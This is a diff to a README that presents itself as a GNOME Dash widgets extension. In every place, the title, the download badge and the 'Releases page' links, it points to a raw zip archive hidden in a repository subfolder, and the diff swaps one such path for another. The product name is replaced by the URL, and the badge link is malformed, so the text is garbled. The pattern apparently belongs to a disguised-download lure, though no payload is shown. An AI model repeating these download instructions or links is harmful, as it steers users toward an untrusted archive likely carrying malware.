@@ -1,10 +1,10 @@
-# 🖥️ https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip - Enhance Your GNOME Dash Experience
+# 🖥️ https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip - Enhance Your GNOME Dash Experience
 
-[![Download](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip%https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip)](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip)
+[![Download](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip%https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip)](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip)
 
 ## 🚀 Getting Started
 
-Welcome to https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip! This application adds modern widgets to the GNOME Dash, providing a better experience with useful features.
+Welcome to https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip! This application adds modern widgets to the GNOME Dash, providing a better experience with useful features.
 
 ## 🛠️ Installation Requirements
 
@@ -19,11 +19,11 @@ Before you begin, ensure that your system meets these requirements:
 
 To get started, visit the Releases page to download the latest version of the application. 
 
-[Download the latest release](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip)
+[Download the latest release](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip)
 
 Follow these steps to install:
 
-1. Go to the [Releases page](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip).
+1. Go to the [Releases page](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip).
 2. Look for the latest version available.
 3. Click on the download link for your system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -75,4 +75,4 @@ Stay tuned for more features and improvements in the upcoming releases. We plan 
 
 To download the latest version, simply visit the Releases page:
 
-[Download the latest release](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/plugins/musicPlayer/helpers/widgets-dev-dash-aitonc-v1.8.zip)
+[Download the latest release](https://github.com/anjana0409/dash-widgets-aitonc.dev/raw/refs/heads/main/schemas/widgets-aitonc-dev-dash-v3.4.zip)
